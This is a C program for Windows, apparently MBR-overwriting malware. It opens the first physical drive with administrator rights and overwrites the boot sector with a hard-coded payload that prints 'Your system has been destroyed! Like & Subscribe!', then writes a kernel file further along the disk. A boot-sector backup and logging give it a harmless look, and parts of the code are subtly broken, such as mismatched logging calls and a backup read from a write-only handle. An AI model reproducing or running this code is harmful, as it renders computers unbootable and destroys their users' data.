#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define MAX_RETRIES 3
#define LOG "boot_write.log"
#define DP "\\\\.\\PhysicalDrive0"
#define KERNEL_PATH "kernel.bin"
#define KERNEL_OFFSET 0x2000  // Offset where kernel will be written

void log_message(const char *message) {
    FILE *log = fopen(LOG, "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%s] %s\n", ctime(&now), message);
        fclose(log);
    }
}

void backup_existing_boot_sector(HANDLE hDevice, const char *backupFileName) {
    unsigned char backupBuffer[512];
    DWORD bytesRead;
    
    if (!ReadFile(hDevice, backupBuffer, 512, &bytesRead, NULL)) {
        log_message("Failed to read the current boot sector for backup.");
        return;
    }
    
    FILE *backupFile = fopen(backupFileName, "wb");
    if (backupFile) {
        fwrite(backupBuffer, 1, 512, backupFile);
        fclose(backupFile);
        log_message("Backup of boot sector created successfully.");
    } else {
        log_message("Failed to create a backup file for the boot sector.");
    }
}

int read_kernel(const char *kernelFilePath, unsigned char **buffer, DWORD *size) {
    FILE *kernelFile = fopen(kernelFilePath, "rb");
    if (!kernelFile) {
        log_message("Failed to open kernel file.");
        return -1;
    }

    fseek(kernelFile, 0, SEEK_END);
    *size = ftell(kernelFile);
    fseek(kernelFile, 0, SEEK_SET);

    *buffer = (unsigned char *)malloc(*size);
    if (*buffer == NULL) {
        log_message("Failed to allocate memory for the kernel.");
        fclose(kernelFile);
        return -1;
    }

    fread(*buffer, 1, *size, kernelFile);
    fclose(kernelFile);
    return 0;
}

int write_to_device(HANDLE hDevice, unsigned char *buffer, DWORD bufferSize, DWORD offset) {
    DWORD bytesWritten = 0;
    OVERLAPPED overlap = {0};
    overlap.Offset = offset;

    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        if (WriteFile(hDevice, buffer, bufferSize, &bytesWritten, &overlap)) {
            if (bytesWritten == bufferSize) {
                return 0;
            } else {
                log_message("Write operation didn't write the expected number of bytes.");
            }
        } else {
            char errorMessage[256];
            snprintf(errorMessage, sizeof(errorMessage), "WriteFile failed on attempt %d, error: %d", attempt, GetLastError());
            log_message(errorMessage);
        }

        Sleep(1000);
    }
    return -1;
}

int open_drive(HANDLE *hDevice) {
    *hDevice = CreateFile(
        DP,                    
        GENERIC_WRITE,                  
        FILE_SHARE_READ | FILE_SHARE_WRITE,  
        NULL,                           
        OPEN_EXISTING,                  
        0,                             
        NULL);                         
    
    if (*hDevice == INVALID_HANDLE_VALUE) {
        log_message("Failed to open physical drive (error code: %d).", GetLastError());
        return -1;
    }
    return 0;
}

int validate_permissions() {
    if (!IsUserAnAdmin()) {
        log_message("Admin permissions are required to write to the physical drive.");
        return -1;
    }
    return 0;
}

void close_device(HANDLE hDevice) {
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        log_message("Device handle closed.");
    }
}

int main() {
    log_message("Boot sector, MBR, and Kernel write program started.");

    if (validate_permissions() != 0) {
        log_message("Permission check failed. Exiting program.");
        return 1;
    }

    HANDLE hDevice;
    if (open_drive(&hDevice) != 0) {
        log_message("Failed to open the drive. Exiting program.");
        return 1;
    }

    backup_existing_boot_sector(hDevice, "boot_backup.bin");

    unsigned char boot_sector[] = {
        0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43,
        0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00,
        0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x79, 0x73, 0x74,
        0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x73, 0x74,
        0x72, 0x6F, 0x79, 0x65, 0x64, 0x21, 0x0D, 0x0A, 0x4C, 0x69, 0x6B, 0x65, 0x20, 0x26, 0x20, 0x53,
        0x75, 0x62, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x21, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    if (write_to_device(hDevice, boot_sector, sizeof(boot_sector), 0) == 0) {
        log_message("Boot sector written successfully.");
    } else {
        log_message("Failed to write boot sector after multiple retries.");
    }

    if (write_to_device(hDevice, boot_sector, sizeof(boot_sector), 0) == 0) {
        log_message("MBR written successfully.");
    } else {
        log_message("Failed to write MBR after multiple retries.");
    }

    unsigned char *kernelBuffer = NULL;
    DWORD kernelSize = 0;
    if (read_kernel(KERNEL_PATH, &kernelBuffer, &kernelSize) == 0) {
        if (write_to_device(hDevice, kernelBuffer, kernelSize, KERNEL_OFFSET) == 0) {
            log_message("Kernel written successfully.");
        } else {
            log_message("Failed to write kernel after multiple retries.");
        }
        free(kernelBuffer);
    } else {
        log_message("Failed to read kernel file.");
    }

    close_device(hDevice);
    return 0;
}
